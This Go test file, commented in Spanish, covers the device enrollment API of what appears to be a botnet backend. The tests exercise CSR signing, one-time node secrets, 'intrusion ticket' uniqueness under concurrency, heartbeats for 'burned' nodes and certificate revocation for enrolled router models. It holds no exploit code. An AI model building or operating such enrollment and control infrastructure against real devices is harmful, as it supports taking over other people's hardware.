// Test del alta completa (T-0802): gates del contrato, CA offline que
// firma el CSR (verificacion openssl real), node_secret de emision
// unica con su fila en node_secrets, y ausencia de clave privada en los
// logs. Requiere Postgres (testenv skip si falta) y openssl en PATH
// (limitacion anotada si no esta).
package handlers

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/redis/go-redis/v9"

	"github.com/botnet/botnet/cmd/botnet-api/repo"
	"github.com/botnet/botnet/cmd/botnet-api/services"
	"github.com/botnet/botnet/internal/backend"
	"github.com/botnet/botnet/internal/backend/testenv"
	"github.com/botnet/botnet/pkg/proto"
)

type enrollHarness struct {
	DB   *sql.DB
	deps *Deps
}

func newEnrollHarness(t *testing.T) *enrollHarness {
	t.Helper()
	db := testenv.PG(t)
	rdb := testenv.Redis(t)
	ca, err := services.NewCA()
	if err != nil {
		t.Fatal(err)
	}
	cfg := backend.ConfigFromEnv()
	cfg.Rendezvous = []string{"https://rdv.test/rdv/assign"}
	return &enrollHarness{DB: db, deps: &Deps{
		Cfg:   cfg,
		Repo:  repo.New(db),
		RDB:   rdb,
		CA:    ca,
		Alloc: InlineAllocator{},
		Log:   &bytes.Buffer{},
	}}
}

func newCSR(t *testing.T, cn string) string {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	der, err := x509.CreateCertificateRequest(rand.Reader, &x509.CertificateRequest{
		Subject: pkix.Name{CommonName: cn},
	}, key)
	if err != nil {
		t.Fatal(err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE REQUEST", Bytes: der}))
}

// csrForged: CSR con la autocfirma alterada (un bit del ultimo byte de
// la firma ECDSA) — la clave publicada sigue siendo la del dispositivo,
// la firma ya no calza: "firma forjada" del contrato.
func csrForged(t *testing.T) string {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	der, err := x509.CreateCertificateRequest(rand.Reader, &x509.CertificateRequest{
		Subject: pkix.Name{CommonName: services.FleetCN},
	}, key)
	if err != nil {
		t.Fatal(err)
	}
	forged := append([]byte(nil), der...)
	forged[len(forged)-1] ^= 0x01
	if _, err := x509.ParseCertificateRequest(forged); err != nil {
		t.Fatalf("fixture forjado ilegible hasta para parsear: %v", err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE REQUEST", Bytes: forged}))
}

// enrollDo ejecuta el alta y devuelve codigo + body crudo.
func (h *enrollHarness) enrollDo(t *testing.T, token, ticket, csr string) (int, []byte) {
	t.Helper()
	app := NewApp(h.deps)
	body, _ := json.Marshal(map[string]string{
		"arch": "mipsle", "model": "TL-WR740N", "fw": "3.20", "mac": "aa:bb:cc:dd:ee:ff", "csr": csr,
		"consent_at": time.Now().UTC().Format(time.RFC3339), // EP-11 T-1102: el alta nace consentida
	})
	req := httptest.NewRequest("POST", "/v1/enroll", bytes.NewReader(body))
	if token != "" {
		req.Header.Set("X-Device-Token", token)
	}
	if ticket != "" {
		req.Header.Set("X-Intrusion-Ticket", ticket)
	}
	resp, err := app.Test(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, raw
}

// postCSR envia el CSR como body plano-de-JSON minimo (solo csr, para
// los gates: el decoder exige csr no vacio).
func (h *enrollHarness) postCSR(t *testing.T, token, ticket, csr string) int {
	t.Helper()
	code, _ := h.enrollDo(t, token, ticket, csr)
	return code
}

func ticketFor(secret []byte, token, probe string) string {
	sum := sha256.Sum256([]byte(token))
	return proto.SignTicket(secret, proto.Ticket{
		TokenHash: hex.EncodeToString(sum[:]), ProbeID: probe, IAT: time.Now().Unix(),
	})
}

func hashHex(t *testing.T, s string) string {
	t.Helper()
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:])
}

// AC1: CSR valido -> 201 decodificable por el agente (DecodeEnrollAPIResponse),
// openssl verify OK, TTL del cert = 90 dias y fila node_secrets correcta.
func TestEnrollHappyPathAndOpenSSL(t *testing.T) {
	h := newEnrollHarness(t)
	csr := newCSR(t, services.FleetCN)
	code, raw := h.enrollDo(t, "tok-happy-1", ticketFor(h.deps.Cfg.TicketSecret, "tok-happy-1", "probe-1"), csr)
	if code != 201 {
		t.Fatalf("quiero 201, tengo %d body=%s", code, raw)
	}
	// el agente decodea estrictamente las 7 claves: si el backend
	// manda una octava no pactada, esto revienta.
	out, err := proto.DecodeEnrollAPIResponse(bytes.NewReader(raw))
	if err != nil {
		t.Fatalf("el agente no puede decodificar el 201: %v", err)
	}
	if out.NodeID == "" || len(out.Slug) != 12 || out.NodeSecretB == "" || out.TTLS == 0 {
		t.Errorf("7 claves del contrato incompletas: %+v", out)
	}
	if len(out.Rendezvous) == 0 {
		t.Error("rendezvous vacio")
	}
	if days := float64(out.TTLS) / 86400; days < 89.9 || days > 90.1 {
		t.Errorf("ttl_s = %d, quiero ~90 dias", out.TTLS)
	}
	block, _ := pem.Decode([]byte(out.CertPEM))
	if block == nil {
		t.Fatal("cert_pem no es PEM")
	}
	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	if ttl := cert.NotAfter.Sub(cert.NotBefore); ttl < 90*24*time.Hour-time.Hour || ttl > 90*24*time.Hour+48*time.Hour {
		t.Errorf("TTL del cert = %v, quiero 90 d +/- 1 d", ttl)
	}

	dir := t.TempDir()
	certPath := filepath.Join(dir, "cert.pem")
	caPath := filepath.Join(dir, "ca.pem")
	if err := os.WriteFile(certPath, []byte(out.CertPEM), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(caPath, []byte(out.CAPEM), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := exec.LookPath("openssl"); err == nil {
		if o, err := exec.Command("openssl", "verify", "-CAfile", caPath, certPath).CombinedOutput(); err != nil {
			t.Errorf("openssl verify: %v: %s", err, o)
		} else if !strings.Contains(string(o), "OK") {
			t.Errorf("openssl verify sin OK: %s", o)
		}
		if o, err := exec.Command("openssl", "x509", "-noout", "-enddate", "-in", certPath).CombinedOutput(); err != nil {
			t.Errorf("openssl x509 -enddate: %v: %s", err, o)
		} else {
			t.Logf("openssl enddate: %s", strings.TrimSpace(string(o)))
		}
	} else {
		t.Log("openssl ausente en PATH: verificacion de cadena queda para CI (limitacion anotada)")
	}

	var issued, expires time.Time
	var live int
	ctx := context.Background()
	if err := h.DB.QueryRowContext(ctx, `
		SELECT issued_at, expires_at FROM node_secrets
		 WHERE node_id = $1::uuid AND revoked_at IS NULL`, out.NodeID).Scan(&issued, &expires); err != nil {
		t.Fatalf("fila node_secrets: %v", err)
	}
	if time.Since(issued) > 2*time.Minute {
		t.Errorf("issued_at=%v, quiero now", issued)
	}
	if days := expires.Sub(issued).Hours() / 24; days < 89 || days > 91 {
		t.Errorf("expires_at = issued + %.1f d, quiero issued + 90 d", days)
	}
	if err := h.DB.QueryRowContext(ctx, `
		SELECT count(*) FROM node_secrets WHERE node_id = $1::uuid AND revoked_at IS NULL`, out.NodeID).Scan(&live); err != nil || live != 1 {
		t.Errorf("un secreto vivo por nodo: live=%d err=%v", live, err)
	}
	if strings.Contains(h.deps.Log.String(), "BEGIN PRIVATE KEY") {
		t.Error("clave privada vista en logs (grep BEGIN PRIVATE KEY)")
	}

	// Gate 1: token conocido -> 409, incluso sin ticket (orden estricto).
	csr2 := newCSR(t, services.FleetCN)
	if code := h.postCSR(t, "tok-happy-1", "", csr2); code != 409 {
		t.Errorf("re-enroll token conocido: quiero 409, tengo %d", code)
	}
}

// AC2: gates y codigos exactos del contrato + CSR forjado + CN ajena +
// secreto que no se repite (emision unica = el 201).
func TestEnrollGates(t *testing.T) {
	h := newEnrollHarness(t)
	csr := newCSR(t, services.FleetCN)

	if code := h.postCSR(t, "tok-nt", "", csr); code != 428 {
		t.Errorf("sin ticket: quiero 428, tengo %d", code)
	}
	forged := proto.SignTicket([]byte("01234567890123456789012345678901"), proto.Ticket{
		TokenHash: hashHex(t, "tok-forged"), ProbeID: "p", IAT: time.Now().Unix(),
	})
	if code := h.postCSR(t, "tok-forged", forged, csr); code != 403 {
		t.Errorf("ticket forjado: quiero 403, tengo %d", code)
	}
	if code := h.postCSR(t, "tok-csr", ticketFor(h.deps.Cfg.TicketSecret, "tok-csr", "probe-2"), csrForged(t)); code != 400 {
		t.Errorf("CSR forjado: quiero 400, tengo %d", code)
	}
	csrEvil := newCSR(t, "evil-corp")
	if code := h.postCSR(t, "tok-cn", ticketFor(h.deps.Cfg.TicketSecret, "tok-cn", "probe-3"), csrEvil); code != 422 {
		t.Errorf("CN ajena: quiero 422, tengo %d", code)
	}

	// ticket usado -> 409 con el node_id del dueno del ticket (T-0305
	// AC2): la unicidad vive en nodes.ticket_hash con indice unico
	// parcial; otro token que presenta el ticket consumido choca contra
	// el indice y sale 409 — el 403 de la epoca en que el ticket iba
	// atado al tokenHash del dueño desaparece.
	csrOK := newCSR(t, services.FleetCN)
	ticketOK := ticketFor(h.deps.Cfg.TicketSecret, "tok-used", "probe-4")
	code, raw := h.enrollDo(t, "tok-used", ticketOK, csrOK)
	if code != 201 {
		t.Fatalf("alta base: quiero 201, tengo %d body=%s", code, raw)
	}
	var out proto.EnrollAPIResponse
	if err := json.Unmarshal(raw, &out); err != nil {
		t.Fatal(err)
	}
	code, raw = h.enrollDo(t, "tok-usado-alien", ticketOK, newCSR(t, services.FleetCN))
	if code != 409 {
		t.Errorf("ticket usado: quiero 409, tengo %d body=%s", code, raw)
	}
	if !bytes.Contains(raw, []byte(out.NodeID)) {
		t.Errorf("el 409 de ticket usado debe llevar el node_id %s del dueño: %s", out.NodeID, raw)
	}

	// body sin csr (contrato DecodeEnrollAPIRequest) -> 400.
	app := NewApp(h.deps)
	req := httptest.NewRequest("POST", "/v1/enroll", strings.NewReader(`{"arch":"amd64"}`))
	req.Header.Set("X-Device-Token", "tok-nocsr")
	resp, err := app.Test(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 400 {
		t.Errorf("csr vacio: quiero 400, tengo %d", resp.StatusCode)
	}
}

// Suelo del heartbeat del backend: 410 con bye cuando el nodo esta
// burned (baja por pull, §4).
func TestHeartbeatGoneForBurned(t *testing.T) {
	h := newEnrollHarness(t)
	nodeID := testenv.SeedNode(t, h.DB, "ES", "Madrid", 12345)
	ctx := context.Background()
	if _, err := h.DB.ExecContext(ctx, `UPDATE nodes SET status='burned' WHERE node_id=$1::uuid`, nodeID); err != nil {
		t.Fatal(err)
	}
	app := NewApp(h.deps)
	req := httptest.NewRequest("POST", "/v1/heartbeat/"+nodeID, nil)
	resp, err := app.Test(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 410 {
		t.Errorf("heartbeat burned: quiero 410, tengo %d", resp.StatusCode)
	}
	var hbResp proto.HeartbeatResponse
	if b, err := io.ReadAll(resp.Body); err == nil && len(b) > 0 {
		if err := hbResp.Unmarshal(b); err != nil {
			t.Errorf("410 sin HeartbeatResponse: %v", err)
		}
	}
}

// T-1102 AC1 (EP-11): el fixture sin marca de consentimiento no
// entra: 428 y el ticket NO se consume — el retry consentido aterriza
// 201 con el mismo token y ticket.
func TestEnrollSinConsentimiento428(t *testing.T) {
	h := newEnrollHarness(t)
	csr := newCSR(t, services.FleetCN)
	token := "tok-sin-consent"
	ticket := ticketFor(h.deps.Cfg.TicketSecret, token, "probe-consent")

	app := NewApp(h.deps)
	body, _ := json.Marshal(map[string]string{
		"arch": "arm64", "model": "GL-AR750S", "fw": "2102", "mac": "11:22:33:44:55:66", "csr": csr,
	})
	req := httptest.NewRequest("POST", "/v1/enroll", bytes.NewReader(body))
	req.Header.Set("X-Device-Token", token)
	req.Header.Set("X-Intrusion-Ticket", ticket)
	resp, err := app.Test(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 428 {
		t.Fatalf("sin consent_at: quiero 428, tengo %d", resp.StatusCode)
	}
	code, _ := h.enrollDo(t, token, ticket, csr) // mismo ticket, ahora con consent_at
	if code != 201 {
		t.Fatalf("retry consentido: quiero 201 (ticket intacto), tengo %d", code)
	}
}

// T-0305 AC2: la unicidad del ticket esta en el modelo de datos — el
// alta estampa el sha256 del ticket en nodes.ticket_hash (char(64)) y
// el indice unico parcial sobre filas vivas pone al dueno como unica
// fila; otro token con el mismo ticket sale 409 con el node_id del
// dueno, no 403.
func TestEnrollTicketUniqueDataModel(t *testing.T) {
	h := newEnrollHarness(t)
	ctx := context.Background()
	tokenA := "tok-uniq-A"
	ticketA := ticketFor(h.deps.Cfg.TicketSecret, tokenA, "probe-uniq")
	code, raw := h.enrollDo(t, tokenA, ticketA, newCSR(t, services.FleetCN))
	if code != 201 {
		t.Fatalf("alta dueno: quiero 201, tengo %d body=%s", code, raw)
	}
	var outA proto.EnrollAPIResponse
	if err := json.Unmarshal(raw, &outA); err != nil {
		t.Fatal(err)
	}

	// El alta inserto el ticket en la MISMA fila del nodo.
	var stored string
	if err := h.DB.QueryRowContext(ctx,
		`SELECT COALESCE(ticket_hash::text, '') FROM nodes WHERE node_id = $1::uuid`, outA.NodeID).Scan(&stored); err != nil {
		t.Fatalf("nodes.ticket_hash: %v", err)
	}
	if want := hashHex(t, ticketA); stored != want {
		t.Errorf("ticket_hash de la fila = %q, quiero %s (sha256 del ticket wire)", stored, want)
	}
	// Indice UNIQUE parcial sobre filas vivas: la unicidad es un hecho
	// del modelo de datos, no de una clave Redis con TTL.
	var uniq int
	if err := h.DB.QueryRowContext(ctx, `
		SELECT count(*) FROM pg_indexes
		 WHERE tablename = 'nodes' AND indexname = 'nodes_ticket_hash_live_uniq'
		   AND indexdef ~* 'unique.*ticket_hash'
		   AND indexdef ~* 'where.*deleted_at'`).Scan(&uniq); err != nil || uniq != 1 {
		t.Errorf("indice unico parcial de ticket_hash: n=%d err=%v", uniq, err)
	}

	// Mismo ticket + otro token (Gate1 no aplica: token virgen): 409 por
	// conflicto de indice, con el node_id del dueno.
	code, raw = h.enrollDo(t, "tok-uniq-alien", ticketA, newCSR(t, services.FleetCN))
	if code != 409 {
		t.Fatalf("mismo ticket + otro token: quiero 409, tengo %d body=%s", code, raw)
	}
	var conflict struct {
		Error  string `json:"error"`
		NodeID string `json:"node_id"`
	}
	if err := json.Unmarshal(raw, &conflict); err != nil || conflict.NodeID != outA.NodeID {
		t.Errorf("el 409 del ticket debe llevar node_id=%s del dueno: %s", outA.NodeID, raw)
	}
	var holders int
	if err := h.DB.QueryRowContext(ctx, `SELECT count(*) FROM nodes WHERE ticket_hash = $1`, hashHex(t, ticketA)).Scan(&holders); err != nil || holders != 1 {
		t.Errorf("filas vivas por ticket: n=%d err=%v, quiero 1", holders, err)
	}

	// Ticket fresco + token fresco: 201 como siempre.
	if code, _ = h.enrollDo(t, "tok-uniq-B", ticketFor(h.deps.Cfg.TicketSecret, "tok-uniq-B", "probe-uniq-b"), newCSR(t, services.FleetCN)); code != 201 {
		t.Errorf("alta con ticket fresco: quiero 201, tengo %d", code)
	}
}

// T-0305 AC3: 100 alts concurrentes con el MISMO ticket y cada una su
// token propio y virgen — el reparto del contrato es 1x201 + 99x409 y
// ningun 403 (con la unicidad en Redis SETNX ticket:{tokenHash} salia
// 1x201 + 99x403 porque cada atacante tenia su propia clave SETNX).
func TestEnrollTicketConcurrent(t *testing.T) {
	h := newEnrollHarness(t)
	ctx := context.Background()
	const n = 100
	// Espejo del pool de produccion (internal/db.Open: MaxOpenConns=8):
	// 100 peticiones concurrentes reutilizan 8 conexiones; sin tope,
	// el Postgres portable del host rechaza la tormenta de dials y el
	// test se pone rojo por el motor, no por el contrato. MaxIdle 8
	// conserva las conexiones caldeadas durante la contienda.
	h.DB.SetMaxOpenConns(8)
	h.DB.SetMaxIdleConns(8)
	app := NewApp(h.deps)
	ticket := ticketFor(h.deps.Cfg.TicketSecret, "tok-conc-0", "probe-race")

	bodies := make([][]byte, n)
	for i := range bodies {
		b, err := json.Marshal(map[string]string{
			"arch": "amd64", "model": "x", "fw": "1", "mac": "aa:bb:cc:dd:ee:ff",
			"csr":        newCSR(t, services.FleetCN),
			"consent_at": time.Now().UTC().Format(time.RFC3339),
		})
		if err != nil {
			t.Fatal(err)
		}
		bodies[i] = b
	}

	codes := make([]int, n)
	respBody := make([][]byte, n)
	// El motor portable del host pierde dials bajo tormenta (lo
	// documenta ep08_ddl_test); 8 en vuelo igual que el pool es lo que
	// veria un servidor real con 100 curls. La contienda del indice
	// sigue siendo simultanea entre los concurrentes.
	sem := make(chan struct{}, 8)
	start := make(chan struct{})
	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			<-start
			sem <- struct{}{}
			defer func() { <-sem }()
			// Un 500 por dial caido del motor portable (el body lo
			// dice: "failed to connect") se reintenta: es el motor, no
			// el contrato; cualquier otro codigo se cuenta tal cual.
			for attempt := 0; ; attempt++ {
				req := httptest.NewRequest("POST", "/v1/enroll", bytes.NewReader(bodies[i]))
				req.Header.Set("X-Device-Token", fmt.Sprintf("tok-conc-%d", i))
				req.Header.Set("X-Intrusion-Ticket", ticket)
				resp, err := app.Test(req, 60000)
				if err != nil {
					t.Errorf("concursante %d: %v", i, err)
					codes[i] = 0
					return
				}
				raw, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				codes[i] = resp.StatusCode
				if resp.StatusCode == 500 && attempt < 3 && bytes.Contains(raw, []byte("failed to connect")) {
					time.Sleep(300 * time.Millisecond)
					continue
				}
				if resp.StatusCode != 201 && resp.StatusCode != 409 {
					respBody[i] = raw
				}
				break
			}
		}(i)
	}
	// Precalentar el pool: 8 conexiones creadas de una en una con
	// reintento (las ventanas de dial del motor portable del host las
	// documenta ep08_ddl_test); la contienda posterior no abre dials.
	for i := 0; i < 8; i++ {
		for attempt := 0; ; attempt++ {
			var one int
			err := h.DB.QueryRowContext(ctx, `SELECT 1`).Scan(&one)
			if err == nil {
				break
			}
			if attempt >= 5 {
				t.Fatalf("calentar pool: %v", err)
			}
			time.Sleep(300 * time.Millisecond)
		}
	}
	close(start)
	wg.Wait()

	var ok201, ok409, other int
	for i, c := range codes {
		switch c {
		case 201:
			ok201++
		case 409:
			ok409++
		default:
			t.Logf("codigo inesperado %d: %s", c, respBody[i])
			other++
		}
	}
	if ok201 != 1 || ok409 != n-1 || other != 0 {
		t.Errorf("reparto concurrente: %dx201 + %dx409 + %d otros, quiero 1x201 + %dx409 + 0 otros", ok201, ok409, other, n-1)
	}
	// La ganadora es unica a nivel de fila: una sola fila con ese ticket.
	var winners int
	if err := h.DB.QueryRowContext(ctx, `SELECT count(*) FROM nodes WHERE ticket_hash = $1`, hashHex(t, ticket)).Scan(&winners); err != nil || winners != 1 {
		t.Errorf("filas con el ticket en disputa: n=%d err=%v, quiero 1", winners, err)
	}
	var total int
	if err := h.DB.QueryRowContext(ctx, `SELECT count(*) FROM nodes`).Scan(&total); err != nil || total != 1 {
		t.Errorf("nodos creados por la contienda: n=%d err=%v, quiero 1", total, err)
	}
}

// T-0302 AC2 (regresion) + T-0308 AC3: un 409 IDEMPOTENTE del mismo
// alta (el nodo es el dueno del ticket presentado) conserva vivo el
// serial del cert; solo el 409 de re-enrolado TRAS RESET (ticket nuevo
// sobre nodo existente) lo mete en la CRL y desaloja node:{id}:cert_serial.
func TestEnroll409SerialLifecycle(t *testing.T) {
	h := newEnrollHarness(t)
	ctx := context.Background()
	token := "tok-lifecycle"
	ticket1 := ticketFor(h.deps.Cfg.TicketSecret, token, "probe-life-1")
	code, raw := h.enrollDo(t, token, ticket1, newCSR(t, services.FleetCN))
	if code != 201 {
		t.Fatalf("alta: quiero 201, tengo %d body=%s", code, raw)
	}
	var out proto.EnrollAPIResponse
	if err := json.Unmarshal(raw, &out); err != nil {
		t.Fatal(err)
	}
	serialKey := "node:" + out.NodeID + ":cert_serial"
	serial, err := h.deps.RDB.Get(ctx, serialKey).Result()
	if err != nil || serial == "" {
		t.Fatalf("serial vivo en Redis tras el alta: %q err=%v", serial, err)
	}

	// Reintento idempotente: mismo token + mismo ticket (su dueno) ->
	// 409 sin quemar el serial: revoked:{serial} no existe y el
	// cert_serial sigue puesto.
	if code, _ = h.enrollDo(t, token, ticket1, newCSR(t, services.FleetCN)); code != 409 {
		t.Fatalf("reintento idempotente: quiero 409, tengo %d", code)
	}
	if n, _ := h.deps.RDB.Exists(ctx, "revoked:"+serial).Result(); n != 0 {
		t.Errorf("el 409 idempotente quemo el serial vivo (revoked:{serial}=1)")
	}
	if got, gerr := h.deps.RDB.Get(ctx, serialKey).Result(); gerr != nil || got != serial {
		t.Errorf("cert_serial tras reintento: %q err=%v, quiero %q", got, gerr, serial)
	}

	// Re-enrolado tras reset de fabrica: mismo token + ticket FRESCO ->
	// 409 y el serial viejo entra en la CRL y desaloja Redis (T-0308 AC3).
	ticket2 := ticketFor(h.deps.Cfg.TicketSecret, token, "probe-life-2")
	if code, _ = h.enrollDo(t, token, ticket2, newCSR(t, services.FleetCN)); code != 409 {
		t.Fatalf("re-enrolado tras reset: quiero 409, tengo %d", code)
	}
	if n, _ := h.deps.RDB.Exists(ctx, "revoked:"+serial).Result(); n != 1 {
		t.Errorf("el 409 del reset no metio el serial viejo en la CRL (exists=%d)", n)
	}
	if _, gerr := h.deps.RDB.Get(ctx, serialKey).Result(); gerr != redis.Nil {
		t.Errorf("cert_serial tras el 409 del reset: err=%v, quiero redis.Nil", gerr)
	}
}
